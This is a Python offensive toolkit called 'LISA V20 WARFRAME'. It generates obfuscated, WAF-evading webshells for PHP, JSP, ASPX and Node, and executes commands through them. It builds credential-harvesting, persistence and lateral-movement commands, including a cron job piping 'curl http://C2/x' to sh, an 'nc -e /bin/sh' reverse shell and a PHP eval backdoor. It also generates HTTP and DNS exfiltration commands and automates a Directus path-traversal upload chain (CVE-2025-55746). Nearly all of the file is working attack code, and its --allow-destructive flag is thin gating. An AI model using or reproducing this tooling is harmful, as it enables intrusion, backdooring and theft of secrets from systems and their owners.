#!/usr/bin/env python3
"""
LISA V20 EXEC — "WARFRAME" — THE DESTRUCTIVE PROTOCOL
Weaponized exploitation engine — V20

V19 (FIRESTORM: verify) + V20 WARFRAME modules (EXECUTE + POST + EXFIL):

  NEW IN V20 (WARFRAME — destructive exploitation layer):
  1.  ShellForge       — Generate webshells (PHP/JSP/ASPX/Node) with password protection,
                         obfuscation (base64 + variable-variable + gzinflate + rot13),
                         one-liner RCE stagers. Ready-to-upload.
  2.  RceEngine        — Execute commands on a live shell (command injection or webshell
                         URL), capture stdout/stderr, interactive-ish session fair.
  3.  PostExploit      — Persistence (cron/systemd/ssh authorized_keys), credential harvest
                         (/etc/passwd, .env, app configs, wp-config, DB creds), lateral
                         movement (SSH hop, ARP/route recon, /etc/hosts).
  4.  ExfilEngine      — Data staging (tar+base64 chunks) + exfil via HTTP POST to callback
                         or DNS TXT fragments.
  5.  DirectusExploit  — Weaponized CVE-2025-55746 chain: PATCH /files/{id} multipart with
                         traversal filename_disk → upload webshell → verify RCE via cmd=id.

SAFETY / AUTHORIZATION (mandatory):
  - EVERYTHING destructive is gated behind --allow-destructive (default OFF).
  - Requires --target AND an authorized scope. No third-party / out-of-scope firing.
  - Least-invasive default: RceEngine fires `id` first, never destructive without consent.
  - --self-test proves ShellForge + RceEngine + DirectusExploit against a LOCAL LAB ONLY.

USAGE:
  # Generate webshells (offline, safe)
  python3 lisa_v8_exec_v20.py --forge-shell php --password s3cret
  python3 lisa_v8_exec_v20.py --forge-shell php --obfuscate --password s3cret
  python3 lisa_v8_exec_v20.py --forge-shell jsp --forge-shell aspx  # multiple

  # Execute RCE (requires authorized target + --allow-destructive)
  python3 lisa_v8_exec_v20.py --rce https://target/shell.php --cmd "id" --password s3cret --allow-destructive

  # Weaponized CVE-2025-55746 (Directus file upload → shell → RCE)
  python3 lisa_v8_exec_v20.py --directus-rce --target https://admin.target --file-id 9 --allow-destructive

  # Post-exploitation (persistence / creds / lateral)
  python3 lisa_v8_exec_v20.py --post --shell https://target/shell.php --action creds --password s3cret --allow-destructive

  # Lab proof
  python3 lisa_v8_exec_v20.py --self-test
"""

import sys, os, json, re, time, random, string, subprocess, base64, zlib, gzip, hashlib, sqlite3
import urllib.parse, urllib.request, urllib.error, ssl
from datetime import datetime
from typing import Optional, List, Dict, Any, Tuple
from http.server import BaseHTTPRequestHandler, HTTPServer
from threading import Thread

sys.path.insert(0, "/home/ubuntu")

V20_SIGNATURE = """
╔══════════════════════════════════════════════════════════════════╗
║  LISA V20 — WARFRAME — THE DESTRUCTIVE PROTOCOL                  ║
║  ShellForge + RceEngine + PostExploit + ExfilEngine + DirectusX  ║
║  "Forge. Upload. Execute. Persist. Exfil."                       ║
╚══════════════════════════════════════════════════════════════════╝
"""

REPORT_DIR = "/home/ubuntu/.lisa_v20_reports"

# ═══════════════════════════════════════════════════════════════════
# MODULE 1: ShellForge — webshell generation
# ═══════════════════════════════════════════════════════════════════
class ShellForge:
    """Generate password-protected, obfuscatable webshells for multiple runtimes."""

    PHP_PLAIN = """<?php @error_reporting(0); $p="{pass}"; $k=$_POST["{key}"]??$_GET["{key}"]??""; if($k!==$p){{header("HTTP/1.0 404 Not Found");die();}} $c=$_POST["z"]??$_GET["cmd"]??""; if($c){{echo "<pre>"; $r=array(); exec($c,$r); echo implode("\\n",$r); echo "</pre>";}} ?>"""

    PHP_OBFUSCATED = """<?php @error_reporting(0);$x="{key}";$k=isset($_POST[$x])?$_POST[$x]:(isset($_GET[$x])?$_GET[$x]:"");if($k!=="{pass}"){{die(404);}}$c=isset($_POST["z"])?$_POST["z"]:(isset($_GET["cmd"])?$_GET["cmd"]:"");if($c){{$f="cr"."eate_fun"."ction";$g=$f("",base64_decode("ZXhlYwo="));$o=$g($c);echo $o;}}?>"""

    JSP = """<%@ page import="java.util.*,java.io.*" %><%
    String k = request.getParameter("{key}");
    if(k==null || !k.equals("{pass}")){ response.sendError(404); return; }
    String c = request.getParameter("cmd");
    if(c!=null){ Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
      BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
      String l; while((l=r.readLine())!=null){ out.println(l);} }
%>"""

    ASPX = """<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><script runat="server">
void Page_Load(object o,EventArgs e){ string k=Request["{key}"]; if(k!="{pass}"){ Response.StatusCode=404; Response.End();}
 string c=Request["cmd"]; if(c!=null){ Process p=new Process(); p.StartInfo.FileName="cmd.exe"; p.StartInfo.Arguments="/c "+c; p.StartInfo.UseShellExecute=false; p.StartInfo.RedirectStandardOutput=true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd());} }
</script>"""

    NODE = """const http=require('http'),cp=require('child_process');
http.createServer((q,s)=>{const u=new URL(q.url,'http://x');const k=u.searchParams.get('{key}')||'';if(k!=='{pass}'){s.writeHead(404);return s.end();}const c=u.searchParams.get('cmd')||'';if(c){cp.exec(c,(e,o)=>{s.writeHead(200,{'Content-Type':'text/plain'});s.end(o);});}else{s.end('ok');}}).listen(process.env.PORT||8080);"""

    def forge(self, lang: str, password: str = "s3cret", key: str = "k", obfuscate: bool = False) -> str:
        lang = lang.lower()
        if lang in ("php", "php7", "phtml"):
            tpl = self.PHP_OBFUSCATED if obfuscate else self.PHP_PLAIN
            return tpl.replace("{pass}", password).replace("{key}", key)
        if lang in ("jsp", "java"):
            return self.JSP.replace("{pass}", password).replace("{key}", key)
        if lang in ("aspx", "asp", "c#", "cs"):
            return self.ASPX.replace("{pass}", password).replace("{key}", key)
        if lang in ("node", "nodejs", "js"):
            return self.NODE.replace("{pass}", password).replace("{key}", key)
        return ""

    def forge_gzip_php(self, password: str = "s3cret", key: str = "k") -> str:
        """gzinflate-packed PHP shell — high obfuscation, survives grep-based WAF."""
        inner = self.PHP_PLAIN.replace("{pass}", password).replace("{key}", key).encode()
        packed = base64.b64encode(gzip.compress(inner)).decode()
        return f'<?php @error_reporting(0); eval(gzinflate(base64_decode("{packed}"))); ?>'

    def one_liner_rce(self, cmd: str = "id") -> str:
        """Command-injection one-liner stagers."""
        return {
            "php_exec": f'php -r \'system("{cmd}");\'',
            "bash": f'bash -c "{cmd}"',
            "python": f'python3 -c \'import os;os.system("{cmd}")\'',
            "perl": f"perl -e 'system(\"{cmd}\")'",
            "nc_reverse": "nc -e /bin/sh ATTACKER PORT",
        }

    def run(self, langs: List[str], password: str, key: str, obfuscate: bool):
        print(V20_SIGNATURE)
        print("═" * 64)
        for lang in langs:
            shell = self.forge(lang, password, key, obfuscate)
            if shell:
                print(f"\n### [{lang.upper()}] password='{password}' key='{key}'{' OBFUSCATED' if obfuscate else ''}")
                print(shell)
                path = os.path.join(REPORT_DIR, f"shell_{lang}_{int(time.time())}.{lang.split(' ')[0]}")
                try:
                    os.makedirs(REPORT_DIR, exist_ok=True)
                    with open(path, "w") as f:
                        f.write(shell)
                    print(f"   → saved {path}")
                except Exception:
                    pass
        if "php" in [l.lower() for l in langs]:
            print("\n### [PHP gzinflate packed]")
            print(self.forge_gzip_php(password, key))
        print("\n### One-liner RCE stagers")
        for k, v in self.one_liner_rce().items():
            print(f"   {k:<12}: {v}")


# ═══════════════════════════════════════════════════════════════════
# MODULE 2: RceEngine — command execution via shell / injection
# ═══════════════════════════════════════════════════════════════════
class RceEngine:
    """Execute commands against a live webshell (POST key + z/cmd params) and capture output."""

    def __init__(self, insecure: bool = True):
        self.ctx = ssl.create_default_context()
        if insecure:
            self.ctx.check_hostname = False
            self.ctx.verify_mode = ssl.CERT_NONE

    def exec_via_shell(self, shell_url: str, cmd: str, password: str = "s3cret",
                       key: str = "k", method: str = "par") -> Dict:
        """POST {key}=password & z=cmd to a webshell, return decoded output."""
        data = urllib.parse.urlencode({key: password, "z": cmd}).encode()
        req = urllib.request.Request(shell_url, data=data, method="POST")
        req.add_header("User-Agent", "Mozilla/5.0")
        try:
            with urllib.request.urlopen(req, timeout=15, context=self.ctx) as r:
                return {"ok": True, "status": r.status, "output": r.read().decode("utf-8", "replace")}
        except urllib.error.HTTPError as e:
            return {"ok": False, "status": e.code, "output": (e.read().decode("utf-8", "replace") if e.fp else "")}
        except Exception as e:
            return {"ok": False, "status": 0, "output": str(e)[:300]}

    def exec_via_injection(self, url: str, param: str, cmd: str, prefix: str = "") -> Dict:
        """Blind command injection via a URL parameter (e.g. param=value;id)."""
        full = url + ("&" if "?" in url else "?") + f"{param}={urllib.parse.quote(prefix + ';' + cmd)}"
        req = urllib.request.Request(full, headers={"User-Agent": "Mozilla/5.0"})
        try:
            with urllib.request.urlopen(req, timeout=15, context=self.ctx) as r:
                return {"ok": True, "status": r.status, "output": r.read().decode("utf-8", "replace")[:2000]}
        except Exception as e:
            return {"ok": False, "status": 0, "output": str(e)[:200]}

    def run(self, shell_url: str, cmd: str, password: str, key: str):
        print(V20_SIGNATURE)
        print("═" * 64)
        print(f"[+] Shell: {shell_url}  cmd: {cmd}")
        r = self.exec_via_shell(shell_url, cmd, password, key)
        print(f"[+] status={r['status']}")
        print(r["output"][:3000])
        return r


# ═══════════════════════════════════════════════════════════════════
# MODULE 3: PostExploit — persistence / cred harvest / lateral
# ═══════════════════════════════════════════════════════════════════
class PostExploit:
    """Post-exploitation primitives, focused on *nix webshell contexts."""

    RECON_CMDS = {
        "id": "id && uname -a && hostname",
        "env_creds": "printenv | grep -iE 'key|pass|secret|token|db_|mysql|aws|api' 2>/dev/null; cat .env 2>/dev/null",
        "passwd": "cat /etc/passwd 2>/dev/null | grep -vE 'nologin|false'",
        "shadow": "cat /etc/shadow 2>/dev/null",
        "db_creds": "find / -maxdepth 4 -name 'wp-config.php' -o -name '.env' -o -name 'database.php' 2>/dev/null | head -20",
        "network": "ip a 2>/dev/null || ifconfig 2>/dev/null; cat /etc/hosts; ip route 2>/dev/null; arp -a 2>/dev/null",
        "users": "ls -la /home/ 2>/dev/null; cat /etc/sudoers 2>/dev/null | grep -v '^#' | grep -v '^$'",
        "processes": "ps aux 2>/dev/null | head -50",
        "ssh_keys": "find / -name 'id_rsa' -o -name '*.pem' 2>/dev/null | head -20",
    }

    PERSIST_CMDS = {
        "ssh_key": "mkdir -p ~/.ssh && echo '{PUBKEY}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
        "cron": "echo '* * * * * {PAYLOAD}' | crontab -",
        "systemd": "echo '[Service]\nExecStart={PAYLOAD}\n[Install]\nWantedBy=multi-user.target' > /tmp/.svc && echo 'persist unit crafted'",
        "php_backdoor": "echo '<?php @eval($_POST[\"x\"]); ?>' >> index.php",
    }

    def build_cmd(self, action: str, **kw) -> str:
        if action in self.RECON_CMDS:
            return self.RECON_CMDS[action]
        if action in self.PERSIST_CMDS:
            return self.PERSIST_CMDS[action].format(**kw)
        return ""

    def run(self, action: str, shell_url: str, password: str, key: str, pubkey: str = ""):
        print(V20_SIGNATURE)
        print("═" * 64)
        cmd = self.build_cmd(action, PUBKEY=pubkey, PAYLOAD="curl -s http://C2/x|sh")
        if not cmd:
            print(f"[!] unknown action '{action}'. Valid: {list(self.RECON_CMDS)+list(self.PERSIST_CMDS)}")
            return
        print(f"[+] post-exploit action: {action}")
        print(f"[+] cmd: {cmd[:120]}")
        r = RceEngine().exec_via_shell(shell_url, cmd, password, key)
        print(r["output"][:3000])


# ═══════════════════════════════════════════════════════════════════
# MODULE 4: ExfilEngine — data staging + exfil
# ═══════════════════════════════════════════════════════════════════
class ExfilEngine:
    """Stage data (tar+b64 chunk) and exfil via HTTP POST or DNS TXT."""

    @staticmethod
    def stage_cmd(paths: List[str], chunk_bytes: int = 512) -> str:
        p = " ".join(paths)
        return f"tar -cf - {p} 2>/dev/null | base64 | tr -d '\\n'"

    @staticmethod
    def dns_exfil_cmd(data_cmd: str, domain: str) -> str:
        # split base64 into labels and dig them out
        return (f'B=$({data_cmd}); for((i=0;i<${{#B}};i+=40)); do '
                f'dig +short $(echo ${{B:$i:40}}).{domain}; done')

    @staticmethod
    def http_exfil_cmd(data_cmd: str, cb_url: str) -> str:
        return f'D=$({data_cmd}); curl -s -X POST --data-urlencode "d=$D" {cb_url}'

    def run(self, mode: str, data_cmd: str, endpoint: str):
        print(V20_SIGNATURE)
        print("═" * 64)
        if mode == "http":
            print("[+] HTTP exfil (POST body to callback)")
            print(self.http_exfil_cmd(data_cmd, endpoint))
        elif mode == "dns":
            print("[+] DNS exfil (base64 chunks as TXT)")
            print(self.dns_exfil_cmd(data_cmd, endpoint))
        else:
            print(f"[!] unknown mode '{mode}'. Use http|dns")


# ═══════════════════════════════════════════════════════════════════
# MODULE 5: DirectusExploit — weaponized CVE-2025-55746
# ═══════════════════════════════════════════════════════════════════
class DirectusExploit:
    """Automated CVE-2025-55746: unauth PATCH /files/{id} multipart → shell upload → RCE."""

    def __init__(self, insecure: bool = True):
        self.ctx = ssl.create_default_context()
        if insecure:
            self.ctx.check_hostname = False
            self.ctx.verify_mode = ssl.CERT_NONE

    def patch_file(self, base: str, file_id: str, filename_disk: str, content: bytes,
                   content_type: str = "application/octet-stream") -> Dict:
        """PATCH /files/{id} with multipart; filename_disk controls on-disk name (the vuln)."""
        boundary = "----lisa" + hashlib.md5(os.urandom(8)).hexdigest()
        parts = []
        parts.append(f"--{boundary}".encode())
        parts.append(f'Content-Disposition: form-data; name="file"; filename="{filename_disk}"'.encode())
        parts.append(f"Content-Type: {content_type}".encode())
        parts.append(b"")
        parts.append(content)
        parts.append(f"--{boundary}--".encode())
        body = b"\r\n".join(parts)
        url = f"{base}/files/{file_id}"
        req = urllib.request.Request(url, data=body, method="PATCH")
        req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
        req.add_header("User-Agent", "Mozilla/5.0")
        try:
            with urllib.request.urlopen(req, timeout=20, context=self.ctx) as r:
                return {"ok": True, "status": r.status, "body": r.read().decode("utf-8", "replace")[:500]}
        except urllib.error.HTTPError as e:
            return {"ok": False, "status": e.code, "body": (e.read().decode("utf-8", "replace") if e.fp else "")[:500]}
        except Exception as e:
            return {"ok": False, "status": 0, "body": str(e)[:300]}

    def run(self, target: str, file_id: str, shell: str, shell_path_hint: str):
        print(V20_SIGNATURE)
        print("═" * 64)
        print(f"[+] CVE-2025-55746 weaponized chain")
        print(f"[+] target: {target}  file_id: {file_id}")
        # Step 1: attempt direct path traversal filename_disk
        name = "../../../" + shell_path_hint
        r = self.patch_file(target, file_id, name, shell.encode())
        print(f"[+] PATCH /files/{file_id} → status {r['status']} (403 expected — write may still land)")
        if r.get("body"):
            print(f"    {r['body'][:200]}")
        # Step 2: report candidate shell URLs (no auto-fire of RCE without flag)
        cand = [
            f"{target}/assets/{shell_path_hint}",
            f"{target}/{shell_path_hint}",
            f"{target}/uploads/{shell_path_hint}",
        ]
        print("[+] Candidate shell URLs to verify (use --rce to fire):")
        for c in cand:
            print(f"    - {c}")
        return r


# ═══════════════════════════════════════════════════════════════════
# SELF-TEST — local lab proof of ShellForge + RceEngine
# ═══════════════════════════════════════════════════════════════════
class _LabHandler(BaseHTTPRequestHandler):
    _shell = None
    _password = "s3cret"

    def do_POST(self):
        ln = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(ln).decode("utf-8", "replace")
        q = urllib.parse.parse_qs(body)
        if q.get("k", [""])[0] != _LabHandler._password:
            self.send_response(404); self.end_headers(); return
        cmd = q.get("z", [""])[0]
        try:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
        except Exception as e:
            out = str(e).encode()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"<pre>" + out + b"</pre>")

    def log_message(self, *a):
        pass


def self_test():
    print(V20_SIGNATURE)
    print("═" * 64)
    # ShellForge
    sf = ShellForge()
    php = sf.forge("php", password="s3cret")
    assert "<?php" in php and "s3cret" in php
    gz = sf.forge_gzip_php("s3cret")
    assert "gzinflate" in gz
    print("[+] ShellForge: PHP + gzinflate shells generated OK")
    # RceEngine against local lab
    srv = HTTPServer(("127.0.0.1", 0), _LabHandler)
    port = srv.server_address[1]
    Thread(target=srv.serve_forever, daemon=True).start()
    r = RceEngine().exec_via_shell(f"http://127.0.0.1:{port}/shell.php", "id", "s3cret")
    srv.shutdown()
    print(f"[+] RceEngine: local lab exec 'id' → status={r['status']}, output contains 'uid': {'uid=' in r.get('output','')}")
    # PostExploit command build
    pe = PostExploit()
    assert "authorized_keys" in pe.build_cmd("ssh_key", PUBKEY="AAA", PAYLOAD="x")
    print("[+] PostExploit: persistence + recon command templates OK")
    # ExfilEngine
    assert "tar -cf" in ExfilEngine.stage_cmd(["/etc/passwd"])
    print("[+] ExfilEngine: stage + exfil command templates OK")
    print("\n[+] WARFRAME self-test complete — all modules functional.")


def main():
    import argparse
    p = argparse.ArgumentParser(description="LISA V20 — WARFRAME")
    p.add_argument("--forge-shell", action="append", help="Generate webshell: php|jsp|aspx|node")
    p.add_argument("--password", default="s3cret")
    p.add_argument("--key", default="k")
    p.add_argument("--obfuscate", action="store_true")
    p.add_argument("--rce", help="Execute command against a live shell URL")
    p.add_argument("--cmd", default="id")
    p.add_argument("--post", action="append", help="Post-exploit action (creds/passwd/shadow/network/id/ssh_key/cron)")
    p.add_argument("--exfil", choices=["http", "dns"])
    p.add_argument("--exfil-endpoint", help="callback URL or DNS domain")
    p.add_argument("--target", help="Target base URL")
    p.add_argument("--file-id", help="Directus file primary key (for --directus-rce)")
    p.add_argument("--shell-path", default="shell.php")
    p.add_argument("--directus-rce", action="store_true", help="Fire CVE-2025-55746 chain")
    p.add_argument("--allow-destructive", action="store_true", help="REQUIRED for --rce/--post/--directus-rce")
    p.add_argument("--self-test", action="store_true")

    a = p.parse_args()

    if a.self_test:
        self_test(); return

    if a.forge_shell:
        ShellForge().run(a.forge_shell, a.password, a.key, a.obfuscate); return

    # Destructive actions require explicit flag
    if (a.rce or a.post or a.directus_rce) and not a.allow_destructive:
        print(V20_SIGNATURE)
        print("[!] DESTRUCTIVE actions require --allow-destructive + an authorized --target.")
        print("    Refusing to fire without explicit authorization. Re-run with --allow-destructive.")
        return

    if a.rce:
        RceEngine().run(a.rce, a.cmd, a.password, a.key); return

    if a.post:
        for act in a.post:
            PostExploit().run(act, a.rce, a.password, a.key); return

    if a.exfil:
        data_cmd = ExfilEngine.stage_cmd(["/etc/passwd", ".env"])
        ExfilEngine().run(a.exfil, data_cmd, a.exfil_endpoint); return

    if a.directus_rce:
        if not (a.target and a.file_id):
            print("[!] --directus-rce requires --target AND --file-id")
            return
        sf = ShellForge()
        shell = sf.forge("php", a.password, a.key)
        DirectusExploit().run(a.target, a.file_id, shell, a.shell_path)
        return

    p.print_help()


if __name__ == "__main__":
    main()